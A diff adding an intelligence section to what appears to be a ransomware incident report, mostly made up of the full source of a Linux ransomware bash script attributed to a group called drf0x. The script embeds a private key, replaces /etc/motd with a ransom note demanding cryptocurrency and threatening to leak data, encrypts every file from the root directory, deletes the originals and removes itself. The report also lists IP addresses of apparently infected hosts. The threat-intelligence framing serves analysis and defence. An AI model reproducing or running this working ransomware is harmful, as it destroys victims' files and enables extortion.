@@ -42,4 +42,204 @@ Here is the list of IPs which got infected by this Ransomware Attack
 95.154.204.180
 162.255.119.254
 
+INTEL
+======
+The same PGP Key is found from another group named "drf0x". Here is the source of it:-
+
+#!/usr/bin/env bash
+
+private="-----BEGIN PRIVATE KEY-----
+MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDFiVLFtwUUcizD
+4gUkRJayJQFAW79ZojEE8YLLnfF5x5Z1A2hP/qT21LMOmvMz03gu9Jn3G+Iby8cx
+4OtvUDuG0tx+Cbq2u2lJj+ZmL11mMMbbR9aTWZhGmdVY3T9X2dObJSV94F5Itd3s
+SSf4A+Osb2Ea2Ci6BCK6mCXw7Qrwr4epWuwUiZ2JqfX3Iv5oLmwLOKF/nOM0XzIp
+fyopK10C/Di5erPBIAV2SYQh7sZ0JKRH7biL+s9dPM2e+8Ckuvkqkb1O1lIpOh8j
+8N/dxn/y9w53KGYsSOaN0ZHseBNCbIwW1s22q4iG/p5d+UG+kTRc8HqdmENw65Vv
+S8ycNPnZAgMBAAECggEBAIRgjZ7AEuBrz0IKIqX2bQK/N8J4eZhI0A7fBmcL1npk
+3ZhXCz2oicZ8Le6Yumi9y6mz88Yc4n78JeZwM3aqTuoAPxEb1guFNn68t4s9LJtC
+DtF+p/ahMSIHD2l5A20NJfivgRuFE8ooTqt9LxLPEHFLRsjlmQ1nnhprweleAVnf
+Kl66kGZa/lAF99P7g4+3/hukVHMRPKCCEmc/77bgIw7gXe/lRutFReraGdziGky3
+VkDIx7MUdGp+n4Hf4iqtUzpinN0IlvgFiMvH4aoAr5vDHitEOGuaovyeA51c2qJw
+RGIAJPgWdaKj7yJl65uLmZPLxel2MCrOHqn8jv1zzw0CgYEA47kmxIT9JXoH3r0y
+kxxgzR+W9FiIM+MP01F2IfoELNXP0yCZ5sSQ2p+gT61wwTZWvzmzkE8w+AcsJirs
+ntlTyG5pJNQYTBSJW9lRoXykpgyRyhpEy7OES1NlWslWM2kthJQ/XZiAfaJ504ZL
+cw4q3PhvcSofknRyYpLEYJ8nyg8CgYEA3hCYarpOrDxN55TB5rdU7adX4b6faK2z
+NuV/grn8qqpG4nB1jj8tQI5q1NTzBe4ngLdJ6+uyGln7WvIr0llaCnhJo2Yp4EhX
+5vNw3cKSdlJynZtp3k9FidhMfjrzzX3d7q7n3BFk/UgUPMRDM85q3qZzSEqLy3wI
+G/WCqmMNhZcCgYBOFKMFSPAflHr0VXzs0hMi4gz5VQ3GdLltZIYT2kzqLpmms4vx
+gz6Dp63pA/ggV4hg4uD9vxl0QclSgO9G/A9tLuZgWVTHaVc7pgUGUN2HjdHDMUSb
+b78RsNOU0Gn9ELgpuEcNyYdtDHOnImnmVlo+D/TuIVpX9hNuVxJ8arXS4wKBgC5I
+MSwVVm5JR0db1qnaTeYWOZfAHgM4KKDpZhD96G49fPaWz7ls62aICDYBiAEVaMBH
+8y0re3xIgr2quX1myABkn5xhn5qyGTf2RvDBK7tjZaX5jTAbP3gCT7cDXGrYr9ee
+No7ERVMQob8kfIkgnV94O5C2kLpBSINjQO94I4pTAoGASChZYdSvI46zNc8EnlcD
+G7V1y3S8/Yxg3Nf7wl+s5Qot6CBRmlOOlMMQQ0JQgT5YZWcTM0IP5fEiiO6rt+w/
+zHSS1/V+QNyxwb3nZhxwe0yWyqBKvDfmmxI0pRal7L6RZE9tqh40tn+Ksw4ykg5R
+yROWtY+JIbuJJb26/Z5/4KQ=
+-----END PRIVATE KEY-----"
+echo "$private" > /var/private.pem
+
+key_name="s2zp8fks9a0L"
+echo "Encryption ID: ${key_name}"
+
+PRIVATE_KEY_PATH="/var/private.pem"
+
+if [ ! -f "$PRIVATE_KEY_PATH" ]; then
+  echo "Private key not found at $PRIVATE_KEY_PATH"
+  exit 1
+fi
+
+PRIVATE_KEY=$(cat $PRIVATE_KEY_PATH)
+if [ -z "$PRIVATE_KEY" ]; then
+  echo "Could not read the private key (maybe permission issue?)"
+  exit 1
+fi
+echo "Private Key SSL: $(echo "$PRIVATE_KEY" | head -n 1)..."
+
+login_message="
+
+
+######################################################################################
+#               Encryptions ID : ${key_name}                                         #                
+#                    You have been hacked by drf0x                                   #
+#                                                                                    #
+#                    All your files have been encrypted.                             #
+#                                                                                    #
+# To restore access, you can contact us in Telegram                                  #
+#                                                                                    #
+# Telegram: @DR_EMAM                                                                #
+#                                                                                    #
+# Payment must be made in cryptocurrency.                                            #
+#                                                                                    #
+# The price for decryption is 200 dollars.                                           #
+# Sample decryption can be served upon request.                                      #
+#                                                                                    #
+# After payment, you will receive a key to run the decrypter script                  #
+# on your system to restore your files.                                              #
+# All your database is downloaded and if you are not going to pay in next 3 days     #
+# its going to be published in darknet. Best Regards!                                #
+#                                                                                    #
+#                                                                                    #
+#                                                                                    #
+#  Ransomware Made by drf0x                                                          #
+#                                                                                    #
+######################################################################################
+
+
+"
+echo "$login_message" > /etc/motd
+
+key=$(openssl rand -hex 16)
+iv=$(openssl rand -hex 16)
+echo "Generated key: ${key}"
+echo "Generated IV: ${iv}"
+
+echo -n $key | xxd -r -p | openssl pkeyutl -encrypt -inkey $PRIVATE_KEY_PATH -out /var/key.enc
+if [ $? -eq 0 ]; then
+    echo "Key encrypted successfully: /var/key.enc"
+else
+    echo "Error with key encryption"
+    exit 1
+fi
+
+echo -n $iv | xxd -r -p | openssl pkeyutl -encrypt -inkey $PRIVATE_KEY_PATH -out /var/iv.enc
+if [ $? -eq 0 ]; then
+    echo "IV encrypted successfully: /var/iv.enc"
+else
+    echo "Error with IV encryption"
+    exit 1
+fi
+
+excluded_dirs=(
+    "/proc"
+    "/sys"
+    "/dev"
+    "/run"
+    "/etc"
+    "/usr"
+    "/tmp"
+    "/var/run"
+    "/var/lock"
+    "/var/tmp"
+    "/mnt"
+    "/sbin"
+    "/lib64"
+    "/bin"
+    "/boot"
+    "/lib"
+    "/lib32"
+    "/srv"
+    "/libx32"
+    "/media"
+    "/lost+found"
+)
+
+excluded_files=(
+    "/var/key.enc"
+    "/var/iv.enc"
+    "/var/decrypter.sh"
+    "/var/index_template.html"
+)
+
+is_excluded() {
+    local path=$1
+    for excluded in "${excluded_dirs[@]}"; do
+        if [[ "$path" == "$excluded"* ]]; then
+            return 0
+        fi
+    done
+    for excluded in "${excluded_files[@]}"; do
+        if [[ "$path" == "$excluded" ]]; then
+            return 0
+        fi
+    done
+    return 1
+}
+
+encrypt_directory() {
+    local dir=$1
+    echo "Encrypting directory: $dir"
+    find "$dir" -type f -print0 | while IFS= read -r -d '' file; do
+        if ! is_excluded "$file"; then
+            echo "Encrypting file: $file"
+            openssl enc -aes-128-cbc -K "$key" -iv "$iv" -in "$file" -out "${file}.psaux"
+            if [ $? -eq 0 ]; then
+                echo "[+] : ${file}.psaux"
+                rm -f "$file"
+            else
+                echo "Error encrypting: $file"
+            fi
+        else
+            echo "Excluded file: $file"
+        fi
+    done
+}
+
+encrypt_directory "/"
+
+find / -type d \( -path /proc -o -path /sys -o -path /dev -o -path /run -o -path /tmp -o -path /var/run -o -path /var/lock -o -path /var/tmp -o -path /mnt -o -path /media -o -path /lost+found \) -prune -o -type d -print0 | while IFS= read -r -d '' dir; do
+    if ! is_excluded "$dir"; then
+        cp /var/index_template.html "$dir/index.html"
+    fi
+done
+
+find / -type f \( -path /proc -o -path /sys -o -path /dev -o -path /run -o -path /tmp -o -path /var/run -o -path /var/lock -o -path /var/tmp -o -path /mnt -o -path /media -o -path /lost+found -o -name "*.psaux" -o -name "index.html" -o -name "decrypter.sh" \) -prune -o -type f -print0 | while IFS= read -r -d '' file; do
+    if ! is_excluded "$file"; then
+        echo "[+] : $file"
+        openssl enc -aes-128-cbc -K "$key" -iv "$iv" -in "$file" -out "${file}.psaux"
+        if [ $? -eq 0 ]; then
+            echo "[+] : ${file}.psaux"
+            rm -f "$file"
+        else
+            echo "Error encrypting: $file"
+        fi
+    else
+        echo "Excluded file: $file"
+    fi
+done
+
+rm -- "$0" && exit 0
+
+
+Source: https://paste.tc/re-34547-3
+
 
